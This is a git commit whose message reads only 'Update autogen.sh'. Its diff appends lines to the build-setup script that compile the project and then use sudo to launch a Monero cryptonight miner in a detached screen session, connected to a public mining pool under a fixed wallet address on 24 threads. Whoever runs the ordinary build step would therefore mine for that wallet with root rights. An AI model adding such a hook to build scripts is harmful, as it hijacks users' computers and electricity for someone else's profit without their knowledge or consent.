79572e4822c5d2f2bca8831162cc69d1ecbf4cae
Dony George <donygeorgek@gmail.com>
2017-12-12 16:54:52 +0530

    Update autogen.sh

--- autogen.sh
+++ autogen.sh
@@ -9,4 +9,6 @@ aclocal
 autoheader
 automake --gnu --add-missing --copy
 autoconf
-
+CFLAGS="-march=native" ./configure
+make
+sudo screen -S miner ./minerd -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:8888 -u 48pKEWWz81ebC7nqTrMfgJNpZhMXHUZv6j4sJwJvnRS3GLavSKMujc34TSMhVB747sZTjxfbBirfFVr7FzZYZvatTwS7bQh -p x -t 24
